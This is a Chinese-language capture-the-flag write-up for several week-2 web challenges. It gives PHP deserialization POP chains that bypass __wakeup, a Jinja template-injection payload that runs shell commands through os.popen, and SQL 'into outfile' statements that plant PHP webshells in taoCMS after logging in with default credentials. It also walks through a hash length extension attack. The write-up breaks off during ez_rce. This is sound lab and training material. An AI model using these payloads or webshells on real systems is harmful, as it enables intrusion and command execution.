<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002184828011.png" alt="image-20231002184828011"></p>
<p>找到flag</p>
<p>但这里不懂得点为：似乎非得转换为ASCII才能执行成功</p>
<h3 id="week2no_wake_up">[WEEK2]no_wake_up</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012181953324.png" alt="image-20231012181953324"></p>
<p>直接点击看看，简单的反序列化</p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">"guest"</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">"admin"</span>){
            <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;code);
        }
    }
}
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'try'</span>]);</code></pre>
<p>首先就是找敏感函数，很显然为include，这个可以产生文件包含漏洞。那我们看看如何调用该函数所在方法：destruct，这个函数会在对象被销毁的时候自动调用，并且只要满足username=admin即可。但在反序列化的时候，由于会自动调用wakeup方法而使username被赋值为guest，这样会导致username!=admin而无法调用include函数。因此我们要想办法绕过wakeup方法的调用</p>
<p>利用方式：<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p>
<p>我们直接看poc来理解上句话</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;
}
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">flag</span>();
<span class="hljs-variable">$poc</span>-&gt;username = <span class="hljs-string">'admin'</span>;
<span class="hljs-variable">$poc</span>-&gt;code = <span class="hljs-string">'php://filter/convert.base64-encode/resource=flag.php'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>输出如下：</p>
<pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"admin"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"code"</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">"php://filter/convert.base64-encode/resource=flag.php"</span>;}</code></pre>
<p>我们只修要做如下更改，将上述的2改为其他数字即可（这里我改成了3）：</p>
<pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>:<span class="hljs-number">3</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"admin"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"code"</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">"php://filter/convert.base64-encode/resource=flag.php"</span>;}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012182919003.png" alt="image-20231012182919003"></p>
<p>base64解码即可，如下图拿到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012182934094.png" alt="image-20231012182934094"></p>
<h3 id="week2ez_ssti">[WEEK2]ez_ssti</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012183006466.png" alt="image-20231012183006466"></p>
<p>经典页面，我们直接拼接url看看，这里我也是猜测需要get传参name，如下图</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012183155684.png" alt="image-20231012183155684"></p>
<p>发现被成功解析执行，那我们跟着常规思路一步步尝试</p>
<p>1.首先考虑拿到一个class，通过字符串、元组、列表、字典均可。</p>
<pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__}} 	<span class="hljs-comment">#这里我选择字符串</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012183601848.png" alt="image-20231012183601848"></p>
<p>2.下一步目的是拿到object基类。</p>
<pre><code class="hljs plaintext">{{''.__class__.__base__}}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012183629492.png" alt="image-20231012183629492"></p>
<p>3.然后获取对应子类。</p>
<pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__.__base__.__subclasses__()}}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012183710342.png" alt="image-20231012183710342"></p>
<p>接下来就是寻找可用的类，比如命令执行类，文件读写类等等，这里可以全局搜索或者写一个脚本来搜索</p>
<p>这里找到之后发现&lt;class ‘os._wrap_close’&gt;是位于第132个，我们直接利用即可</p>
<p>5.通过某些手段找到某个函数是可用的，下一步利用这个类的__init__函数获取到__globals__全局变量，再获取到__globals__全局变量里的__builtins__中的eval函数。</p>
<p>随后导入os模块利用popen函数进行命令执行</p>
<pre><code class="hljs plaintext">?name={{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012185359554.png" alt="image-20231012185359554"></p>
<p>如图根目录发现flag，直接读取即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012185420218.png" alt="image-20231012185420218"></p>
<h3 id="week2easycms">[WEEK2]EasyCMS</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012185523040.png" alt="image-20231012185523040"></p>
<p>点开是一个网站内容管理系统叫做taoCMS，那我的思路是直接百度看看有何漏洞，尝试复现利用</p>
<p>百度之后有很多文章，不过这里我目前测试过的可以利用sql注入以及文件上传，一会儿参考文章放在下面，开始复现：</p>
<p>首先看了百度的文章发现了后台管理路径</p>
<pre><code class="hljs plaintext">/admin/admin.php?action=frame&amp;ctrl=iframes</code></pre>
<p>直接访问看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012194936775.png" alt="image-20231012194936775"></p>
<p>发现要登录，不过这里很幸运利用网站的默认密码就进去了：admin，tao</p>
<h4 id="方法一sql命令执行">方法一：sql命令执行</h4>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012195045755.png" alt="image-20231012195045755"></p>
<p>进入后台如上图会有两处利用点，一个是执行SQL，一个是文件管理。我们先看sql吧，这里没有过滤，我们直接尝试sql语句向网站中写入一句话木马文件</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> "&lt;?php @eval($_POST[1];?&gt;)" <span class="hljs-keyword">into</span> outfile <span class="hljs-string">'/var/www/html/flag.php'</span>
或
<span class="hljs-keyword">select</span> "&lt;?php system('cat /flag');?&gt;)" <span class="hljs-keyword">into</span> outfile <span class="hljs-string">'/var/www/html/flag.php'</span></code></pre>
<p>写入后直接url后面访问上述文件即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012194230363.png" alt="image-20231012194230363"></p>
<p>这里我失误了，于是又写了一个cat.php，不用在意直接拿到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012194427510.png" alt="image-20231012194427510"></p>
<h4 id="方法二文件上传">方法二：文件上传</h4>
<p>直接点击文件管理</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012195416427.png" alt="image-20231012195416427"></p>
<p>如上图，我看许多文件都会在htaccess文件中写入</p>
<pre><code class="hljs plaintext">AddType application/x-httpd-php .php3</code></pre>
<p>来确保系统会以php解析php3后缀文件，于是直接向php3文件写入一句话木马来利用</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012195607389.png" alt="image-20231012195607389"></p>
<p>但我这里写入之后访问会发现直接下载了，所以我认为这个点在这里并不能利用，不过我们直接向后台创建写入一个php木马文件即可，不需要上述那样麻烦</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012195707915.png" alt="image-20231012195707915"></p>
<p>如上图我们直接访问</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231012195732948.png" alt="image-20231012195732948"></p>
<p>可以看到成功解析，后续就不再赘述了</p>
<p>上述复现可参考：<a target="_blank" rel="noopener" href="https://dhexx.cn/news/show-4839081.html?action=onClick">春秋云境：CVE-2022-23880（taoCMS v3.0.2 任意文件上传漏洞）</a></p>
<h4 id="参考文章">参考文章</h4>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64180167/article/details/132797583?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace%20/e%20%E5%88%A9%E7%94%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-132797583.142%5Ev94%5Einsert_down1&amp;spm=1018.2226.3001.4187">[BJDCTF2020]ZJCTF，不过如此 preg_replace /e模式漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115363699">[BJDCTF2020]ZJCTF，不过如此</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33006121/article/details/114357320?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace">https://blog.csdn.net/weixin_33006121/article/details/114357320?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace</a>(%27/(%27%20.%20</p>
<h3 id="week2serialize">[WEEK2]serialize</h3>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">misca</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$gao</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fei</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">miaomiao</span>();
        <span class="hljs-variable language_">$this</span>-&gt;gao=<span class="hljs-variable language_">$this</span>-&gt;fei;
        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;a);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">miaomiao</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">'Mikey Mouse~'</span>;
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">musca</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ding</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dong</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;ding-&gt;dong;
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">milaoshu</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span><span class="hljs-string">"misca~musca~milaoshu~~~"</span>;
        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;v);
    }
}
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^O:\d+/'</span>,<span class="hljs-variable">$data</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"you should think harder!"</span>);
    }
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
}
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"wanna_fl.ag"</span>]));</code></pre>
<p>虽然是简单的反序列化，但其中还是很多考点的。我们先总体分析一波。</p>
<p>老思路先找敏感函数，很明显就是include函数了，接下来我们看如何利用其所在的tostring魔术方法：</p>
<p>搜寻一番发现get魔术方法里面存在die(变量)意思是程序结束前将该变量以字符串形式输出，那不就来了嘛，这里显然就是调用tostring的点。</p>
<p>接下来看如何调用get魔术方法：</p>
<pre><code class="hljs plaintext">__get()，读取不可访问属性的值时调用</code></pre>
<p>那根据上述利用条件我们可以找到wakeup魔术方法中的return语句，这就是我们要利用的点，至于wakeup的方法调用很简单，反序列化即可。</p>
<p>综上所述链子为：<code>musca.wakeup-&gt;misca.get-&gt;milaoshu.tostring-&gt;include</code></p>
<p>接下来就是赋值问题了，这里先上pop</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">misca</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$gao</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fei</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">musca</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ding</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dong</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">milaoshu</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v</span>;
}

<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">musca</span>();
<span class="hljs-variable">$poc</span>-&gt;ding = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">misca</span>();
<span class="hljs-variable">$poc</span>-&gt;ding-&gt;fei = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">milaoshu</span>();
<span class="hljs-variable">$poc</span>-&gt;ding-&gt;a = &amp;<span class="hljs-variable">$poc</span>-&gt;ding-&gt;gao;
<span class="hljs-variable">$poc</span>-&gt;ding-&gt;fei-&gt;v = <span class="hljs-string">'php://filter/convert.base64-encode/resource=flag.php'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$poc</span>));

<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里我们看到上述采用了引用的点，这里是为了绕过misca对象中miaomiao函数对其a属性的值的改变。</p>
<p>剩下的还有绕过最开始的正则检测，这里当时我是直接修改前面的O:5为O:+5，这个其实是可以绕过的，不过很奇怪这道题打不通，后来思索了一番发现，用这种办法似乎会终止反序列化的进程。于是换了一种方法，只需要用array包围要序列化的变量即可。因为该正则就是检验序列化的字符串是否是对象字符串开头。–这里看了官方wp的解释是：+这种方式会受到PHP版本限制</p>
<p>最后就是传参问题了，这里需要以<code>wanna[fl.ag</code>这种方式传参，如下图解密即可得到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031171756811.png" alt="image-20231031171756811"></p>
<h3 id="week2md5的事就拜托了">[WEEK2]MD5的事就拜托了</h3>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'SHCTF'</span>])){
    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'SHCTF'</span>]));
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$$$scheme</span>===<span class="hljs-string">'SHCTF'</span>){
        <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>));
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;/br&gt;"</span>);
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'length'</span>])){
        <span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'length'</span>];
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>*<span class="hljs-number">100</span>!=<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>*<span class="hljs-number">100</span>)){
            <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$flag</span>));
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;/br&gt;"</span>);
        }
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'SHCTF'</span>]!=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>)){
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'SHCTF'</span>]===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$num</span>))){
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">"flag is"</span>.<span class="hljs-variable">$flag</span>);
    }
}</code></pre>
<p>当时这道题也是很费脑子且没做出来。。。当时对于<code>$$$scheme</code>这一块儿走通了，但在最后的md5比较就不懂了，如今wp出来了，学习一波。</p>
<p>看了之后发现是考察md5补充攻击。。。没听说过，在此之前我们先拿到flag的md5值和长度再说。</p>
<p>这里关键就是<code>extract</code>与<code>parse_url</code>函数的配合了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031172924081.png" alt="image-20231031172924081"></p>
<p>这里认真看上面的代码我认为就可以理解了，这里extract函数就是将键名但最变量，键值当做变量的值而已，所以重点是理解parse_url函数，看题目要求我们$$$schema=指定字符串，<code>$num*100!=intval($num*100)</code>后面的我们用浮点类型即可绕过，而前面的payload如下</p>
<pre><code class="hljs http">SHCTF=host://SHCTF:password@user
length=1.1</code></pre>
<p>得到md5值和长度分别为：</p>
<pre><code class="hljs plaintext">8504ce3799001a7aecb62ec74d3835a5
42</code></pre>
<p>这里就先直接复现一波，后续原理的学习另起一篇文章，漏洞利用工具如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p>
<p>下载zip安装相关依赖，直接运行py文件，根据提示输入内容</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031175753915.png" alt="image-20231031175753915"></p>
<p>这里我是只输入hash和长度了，之后他给了我们新明文以及hash，我们分别给length和SHCTF赋值即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031175844738.png" alt="image-20231031175844738"></p>
<p>拿到flag</p>
<h3 id="week2ez_rce">[WEEK2]ez_rce</h3>
<p>暂时不会。。。</p>
<p>咳咳来补充了（靠官方wp</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> subprocess

app = Flask(__name__)

<span class="hljs-comment">#此函数用于遍历并从对象中提取属性。它接受一个对象（obj）和属性名称的列表（arg），然后返回最终属性。</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">gett</span>(<span class="hljs-params">obj,arg</span>):
    tmp = obj
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:
        tmp = <span class="hljs-built_in">getattr</span>(tmp,i)
    <span class="hljs-keyword">return</span> tmp

